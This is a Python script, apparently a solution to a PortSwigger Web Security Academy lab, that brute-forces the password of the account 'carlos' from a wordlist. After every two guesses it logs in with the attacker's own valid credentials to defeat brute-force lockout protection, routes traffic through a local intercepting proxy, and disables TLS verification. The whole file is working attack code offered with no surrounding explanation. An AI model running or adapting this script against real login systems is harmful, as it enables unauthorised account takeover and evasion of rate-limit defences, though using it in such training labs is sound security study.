import sys;import requests;import urllib;import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': "http://127.0.0.1:8080", 'https': "https://127.0.0.1:8080"}

def main():
    if len(sys.argv) < 2:
        print("(+) usage: python3 script.py <host_name>")
        return
    
    target_username = "carlos"
    my_username = "wiener"
    my_password = "peter"

    host = sys.argv[1]
    
    passwords_file = open("passwords", 'r')
    passwords = passwords_file.read().split('\n')
    passwords_file.close()
    
    cookies={'session': "1D6mqSowQh1RsbBXN3Wl3rKOePJibQXb"}
    
    count = 0
    creds = {}
    
    i = 0
    print("getting the password")
    while i < len(passwords):
        sys.stdout.write(".")
        sys.stdout.flush()
        #print("once")
        if count == 2:
            creds = {'username': my_username, 'password': my_password}
            count = 0
            sys.stdout.write("\r")
            sys.stdout.flush()

        else:
            creds = {'username':target_username, 'password': passwords[i]}
            i+=1
            count+=1
        response = requests.post(host, verify=False, allow_redirects=False, data=creds, proxies=proxies)
        if response.status_code != 200 and creds['username'] != my_username:
            print("\nusername: %s, password: %s, statuscode: %d" %(creds["username"], creds["password"], response.status_code))

       

if __name__ == "__main__":
    main()
